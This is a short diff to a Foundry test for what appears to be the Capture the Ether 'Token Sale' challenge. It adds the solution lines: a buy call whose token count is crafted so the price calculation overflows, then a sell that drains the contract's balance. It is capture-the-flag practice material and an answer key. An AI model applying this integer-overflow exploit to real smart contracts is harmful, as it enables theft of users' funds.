@@ -26,7 +26,9 @@ contract TokenSaleChallengeTest is Test {
         // your code
         
         // kaktheplanet
-
+        target.buy{value: 415992086870360064 }(type(uint256).max / 1 ether +1);
+        target.sell(address(target).balance/1 ether);
+        
         // end of your code
         vm.stopPrank();
         assertTrue(target.isComplete());
